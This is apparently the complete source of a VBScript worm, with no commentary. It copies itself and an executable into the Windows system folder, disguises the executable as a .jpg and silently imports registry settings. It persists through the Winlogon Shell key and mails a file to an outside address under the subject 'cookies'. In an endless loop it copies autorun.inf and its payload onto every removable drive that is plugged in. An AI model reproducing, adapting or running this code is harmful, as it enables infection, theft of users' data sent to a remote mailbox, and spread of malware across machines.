On Error Resume Next

Set FSO=CreateObject("Scripting.FileSystemObject") 
FSO.CopyFile "svcl32.vbs","C:\WINDOWS\SYSTEM"
FSO.CopyFile "autorun.*","C:\WINDOWS\SYSTEM"
FSO.CopyFile "svcl32.*","C:\WINDOWS\SYSTEM"
FSO.CopyFile "svcl32.exe","C:\WINDOWS\SYSTEM\fot1.jpg"
FSO.CopyFile "C:\WINDOWS\SYSTEM\fot1.jpg","C:\Windows\system\svcl32.exe"
Set wShl = CreateObject("WScript.Shell")
wShl.run "cmd /c regedit /s svcl32.reg"
Set wShl = CreateObject("WScript.Shell")

wShl.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","Explorer.exe c:\windows\system\svcl32.vbs","REG_SZ" 
Set WSHSHELL = CreateObject("WScript.Shell")
WSHSHELL.Run "C:\WINDOWS\SYSTEM\svcl32.exe"
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "fuel@fuel.dn.ua"
objEmail.To = "arnh@bk.ru"
objEmail.Subject = "cookies" 
objEmail.Textbody = "cookies"
objEmail.AddAttachment "c:\windows\system\svcl32.txt"
objEmail.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = _
        "fuel.dn.ua" 
objEmail.Configuration.Fields.Item _
    ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
Set FSO = CreateObject("Scripting.FileSystemObject")
colDrives = Split("D E F G H I J K L M N O P Q R S T U V W X Y Z")
Set dictDrives = CreateObject("Scripting.Dictionary")
For Each Drive In colDrives
    Set Drv = FSO.GetDrive(Drive & ":")
    If Err.Number Then
        dictDrives.Add Drive & ":", False
    Else
        If Drv.DriveType = 1 And Drv.IsReady Then
            dictDrives.Add Drive & ":", True
        Else
            dictDrives.Add Drive & ":", False
        End If
    End If
    Err.Clear
Next
' Бесконечный цикл
While True
    For Each Drive In dictDrives.Keys
        Set Drv = FSO.GetDrive(Drive)
        If (Err.Number) Or (Drv.IsReady = False) Or (Drv.DriveType <> 1) Then
            Flag = False
        Else
            Flag = True
        End If
        Err.Clear
        Current = dictDrives.Item(Drive)
        If Current <> Flag Then
            If Current = False And Flag = True Then
		Set FSO=CreateObject("Scripting.FileSystemObject") 
                FSO.CopyFile "c:\windows\system\autorun.inf",Drive & "\"
		FSO.CopyFile "c:\windows\system\svcl32.exe",Drive & "\"     
                FSO.CopyFile "c:\windows\system\svcl32.dll",Drive & "\" 
		FSO.CopyFile "c:\windows\system\svcl32.vbs",Drive & "\" 
		
            Else
               
            End If
            dictDrives.Item(Drive) = Flag
        End If
    Next
    WScript.Sleep 1000
Wend